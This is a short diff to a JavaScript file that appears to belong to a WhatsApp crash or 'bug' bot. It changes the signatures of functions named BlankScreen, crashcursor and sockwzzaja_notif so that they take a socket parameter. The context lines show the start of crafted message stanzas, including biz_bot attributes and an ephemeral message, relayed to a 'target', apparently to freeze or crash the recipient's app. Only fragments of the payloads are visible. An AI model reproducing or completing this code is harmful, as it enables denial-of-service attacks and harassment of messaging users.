@@ -86,7 +86,7 @@ async function BlankScreen(sock, target, Ptcp = false) {
       }
 
 
-async function crashcursor(target, ptcp = true) {
+async function crashcursor(sock, target, ptcp = true) {
 const stanza = [
 {
 attrs: { biz_bot: '1' },
@@ -236,7 +236,7 @@ participant: { jid : target }
 });
 }
 
-async function sockwzzaja_notif(target) {
+async function sockwzzaja_notif(sock, target) {
 			await sock.relayMessage(target, {
 					ephemeralMessage: {
 						message: {
